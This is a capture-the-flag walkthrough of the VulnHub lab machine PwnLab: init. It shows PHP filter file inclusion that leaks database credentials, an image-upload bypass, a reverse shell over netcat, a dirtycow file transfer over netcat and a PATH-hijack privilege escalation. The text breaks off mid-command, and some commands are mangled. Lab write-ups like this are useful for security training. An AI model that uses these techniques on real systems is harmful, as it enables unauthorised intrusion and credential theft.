#  PwnLab: init

https://www.vulnhub.com/entry/pwnlab-init,158/

I like to do a quick nmap scan and then a full nmap while I am checking out the open ports. `nmap 192.168.1.97` and then:

```
root@kali:~# nmap -p- -T4 -A 192.168.1.97

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-01 17:27 BST
Nmap scan report for pwnlab.home (192.168.1.97)
Host is up (0.00025s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          32894/tcp  status
|_  100024  1          52796/udp  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 41
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolOld, ODBCClient, InteractiveClient, SupportsLoadDataLocal, FoundRows, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 0>&C^.jL|MIfFjf>DxRn
|_  Auth Plugin Name: 88
32894/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:E3:2C:F5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms pwnlab.home (192.168.1.97)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1431.30 seconds
```

## PHP Local File Inclusion (LFI)
We used nikto scan to check for vulnerabilities, it seems that config.php is readable. The web application is vulnerable to LFI, but the usual commands such as `192.168.1.97/?page=/etc/passwd` does not work. Using https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/, it seems that the we can use PHP filters to read the config.php 

```
http://192.168.1.97/?page=php://filter/convert.base64-encode/resource=config

PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8

<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?
```

Now we can log into mysql with those credentials.

```
root@kali:~# mysql -h 192.168.1.97 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 88
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MySQL [(none)]> USE Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |     <--- JWzXuBJJNy
| mike | U0lmZHNURW42SQ== |     <--- SIfdsTEn6I
| kane | aVN2NVltMkdSbw== |     <--- iSv5Ym2GRo
+------+------------------+
3 rows in set (0.00 sec)
```

We get a kent:JWzXuBJJNy as it is base64. When we try to upload our shell, it gets denied, changing to gif leads to an Error 002. We check the upload.php by doing the same exploit after we've logged in as kent. 

```
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

We see that Error 002 is checks the imageinfo, we need to bypass the image info. We can either edit the properties through open source tools or add GIF98 at the start of the php file. Now that we have our shell uploaded, we need to execute it. Visiting the .gif doesnt work. We check the other pages and find that the index page checks if a cookie is set for lang. 

```
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

Normally, includes has some sort of LFI. We change the cookie SESSID to lang and check for `../../../../../../../etc/passwd`, it works! Lets try executing our backdoor `../upload/450619c0f9b99fca3f46d28787bc55c5.gif` with `nc -lvp 1234` on Kali Linux attacker vm. We now have a shell! We can get a TTY shell from `python -c 'import pty; pty.spawn("/bin/sh")'`

## Privilege Escalation

From here, you can use the dirtycow exploit and you can move that by on the attacker vm `nc -lvp 1234 < dirtycow.c` and then in the backdoor shell `nc KaliLinuxIP > dirtycow.c`. Alternatively, you can follow the challenge by logging into `su kane:iSv5Ym2GRo`.

``` 
kane@pwnlab:~$ cd ~ 
cd ~
kane@pwnlab:~$ ls
ls
msgmike
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory      <------ tries to cat, maybe we can change path to the file or even cat
kane@pwnlab:~$ echo ” /bin/bash” > cat          <----- create a file cat with /bin/bash which we will change path to direct it to this, our fake cat
kane@pwnlab:~$export PATH=. : $PATH
kane@pwnlab:~$./msgmike
kane@pwnlab:~$./msg2root
then run the outpu
